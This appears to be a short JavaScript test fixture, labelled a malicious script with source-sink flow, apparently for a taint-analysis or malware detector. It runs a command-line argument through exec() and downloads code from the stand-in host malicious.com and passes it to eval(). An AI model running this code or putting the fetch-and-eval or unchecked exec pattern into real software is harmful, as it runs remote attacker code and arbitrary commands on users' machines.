// Test malicious script with clear source-sink flow
const http = require('http');
const { exec } = require('child_process');

// Source: command line argument
var userCommand = process.argv[2];

// Sink: command execution
exec(userCommand, (error, stdout, stderr) => {
    console.log(stdout);
});

// Source: HTTP request
http.get('http://malicious.com/payload.js', (res) => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => {
        // Sink: eval
        eval(data);
    });
});
